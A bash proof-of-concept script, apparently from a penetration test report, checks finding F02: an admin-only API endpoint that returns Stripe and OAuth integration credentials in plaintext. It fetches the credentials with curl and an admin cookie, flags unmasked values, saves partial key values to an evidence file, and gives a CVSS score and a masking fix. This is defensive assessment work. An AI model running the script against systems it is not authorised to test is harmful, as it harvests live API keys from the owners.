#!/usr/bin/env bash
# F02 — Integration Credentials Returned in Plaintext
#
# Finding: GET /api/integrations/:id/credentials returns fully decrypted
# credentials (Stripe sk_live_..., OAuth tokens) in the response body.
#
# Requires: integrations.credentials.manage feature (admin)
# Impact: Live API keys visible in browser DevTools, proxy logs
#
# Expected (secure): { credentials: { api_key: "sk_li****...key4" } } (masked)
# Expected (insecure): { credentials: { api_key: "sk_live_abc123fullkey..." } }
#
# CVSS v3: AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.9 Medium)

set -uo pipefail

TARGET="${TARGET:-10.0.63.14}"
APP_PORT="${APP_PORT:-3000}"
BASE_URL="${BASE_URL:-http://$TARGET:$APP_PORT}"
ADMIN_COOKIE="${ADMIN_COOKIE:-}"
EVIDENCE_FILE="${EVIDENCE_FILE:-$(dirname "$0")/../evidence/F02-credentials-get.txt}"

mkdir -p "$(dirname "$EVIDENCE_FILE")"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

{
echo "================================================================"
echo " F02: Integration Credentials Returned in Plaintext"
echo " Target: $BASE_URL"
echo " Timestamp: $TIMESTAMP"
echo "================================================================"
echo ""

if [[ -z "$ADMIN_COOKIE" ]]; then
  echo "[!] ADMIN_COOKIE not set. Run: source poc/auth.sh"
  echo ""
  echo "--- PoC (manual) ---"
  echo ""
  echo "# List configured integrations"
  echo "curl -s $BASE_URL/api/integrations \\"
  echo "  -H 'Cookie: auth_token=<token>' | python3 -m json.tool"
  echo ""
  echo "# Fetch credentials for an integration (e.g., stripe)"
  echo "curl -s $BASE_URL/api/integrations/stripe/credentials \\"
  echo "  -H 'Cookie: auth_token=<token>' | python3 -m json.tool"
  echo ""
  echo "# If VULNERABLE: response contains full API key value"
  echo "# If PATCHED: response contains masked value like 'sk_li****...ive4'"
  echo "================================================================"
  exit 0
fi

echo "--- Step 1: List available integrations ---"
INTEGRATIONS=$(curl -s --max-time 10 "$BASE_URL/api/integrations" \
  -H "Cookie: $ADMIN_COOKIE" 2>/dev/null)
echo "Response: $(echo "$INTEGRATIONS" | python3 -m json.tool 2>/dev/null | head -30)"
echo ""

INTEGRATION_IDS=$(echo "$INTEGRATIONS" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    items = data.get('items', data) if isinstance(data, dict) else data
    if isinstance(items, list):
        for item in items:
            if item.get('hasCredentials'):
                print(item.get('id',''))
except: pass
" 2>/dev/null)

if [[ -z "$INTEGRATION_IDS" ]]; then
  echo "[*] No integrations with credentials found, or unable to parse response"
  echo "    Try: INTEGRATION_ID=stripe bash poc/F02-credentials-get.sh"
  echo ""
  INTEGRATION_IDS="${INTEGRATION_ID:-stripe}"
fi

VULN_FOUND=false

for INT_ID in $INTEGRATION_IDS; do
  echo "--- Step 2: GET credentials for '$INT_ID' ---"
  echo "Command: curl -s $BASE_URL/api/integrations/$INT_ID/credentials -H 'Cookie: ...'"
  echo ""

  CREDS=$(curl -s --max-time 10 "$BASE_URL/api/integrations/$INT_ID/credentials" \
    -H "Cookie: $ADMIN_COOKIE" 2>/dev/null)

  echo "Raw response:"
  echo "$CREDS" | python3 -m json.tool 2>/dev/null || echo "$CREDS"
  echo ""

  # Check if actual credential values are present (not masked)
  HAS_REAL_VALUE=$(echo "$CREDS" | python3 -c "
import sys, json, re
try:
    d = json.load(sys.stdin)
    creds = d.get('credentials', {})
    for k, v in creds.items():
        if isinstance(v, str) and len(v) > 8:
            # Check if value looks real (not masked - masked would have many * chars)
            if '****' not in v and '••••' not in v and len(v) > 10:
                print(f'REAL: {k}={v[:6]}...{v[-4:]} (len={len(v)})')
except:
    pass
" 2>/dev/null)

  if [[ -n "$HAS_REAL_VALUE" ]]; then
    echo "RESULT: VULNERABLE — Full credential values returned (not masked)"
    echo "Evidence: $HAS_REAL_VALUE"
    VULN_FOUND=true
  else
    echo "RESULT: PASS or NO CREDENTIALS — Values appear masked or empty"
  fi
  echo ""
done

echo "--- Summary ---"
if $VULN_FOUND; then
  echo "RESULT: VULNERABLE — Live credentials visible in API response"
  echo "IMPACT: Any admin can retrieve Stripe/OAuth keys via browser DevTools"
  echo "        Keys travel through proxies and browser history unmasked"
else
  echo "RESULT: PASS or NOT TESTABLE — No live credentials to verify"
fi
echo ""
echo "Remediation: Return masked values from credentials route"
echo "  credentials/route.ts:61 — replace 'credentials: values' with 'credentials: maskCredentials(values)'"
echo "================================================================"
} | tee "$EVIDENCE_FILE"

echo "[+] Evidence saved to: $EVIDENCE_FILE"
